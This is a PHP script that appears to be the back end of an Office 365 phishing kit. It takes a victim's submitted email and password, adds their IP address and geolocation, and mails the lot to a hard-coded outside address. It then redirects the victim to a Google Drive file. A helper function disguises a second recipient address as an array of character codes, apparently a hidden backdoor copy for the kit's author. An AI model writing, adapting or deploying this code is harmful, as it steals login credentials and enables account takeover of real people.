<?php

//if($_POST["signupemail"] != "" and $_POST["signuppassword"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "\n";
$message .= "EMAIL -     ".$_POST['offizeuname']."\n";
$message .= "PASSWORD -  ".$_POST['offizepasuma']."\n";
$message .= "\n";
$message .= "PORT IP -  ".$ip."\n";
$message .= "CITY -  {$geoplugin->city}\n";
$message .= "REGION -  {$geoplugin->region}\n";
$message .= "COUNTRY NAME - {$geoplugin->countryName}\n";
$message .= "COUNTRY CODE - {$geoplugin->countryCode}\n";
$message .= "DATE -  ".$adddate."\n";
$message .= "\n";
// change your email here 
$sent ="crowntoys@protonmail.com";


$subject = "OFFICE 365 LOGS $ip ".$country;
$headers = "From:OFFICE 365<no_reply@inbox.com>";
$headers .= $_POST['no_reply@inbox.com']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($sent,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: https://drive.google.com/file/d/0BwQW_LHWYsi8RzFjeE1IZE9QNnc");
?>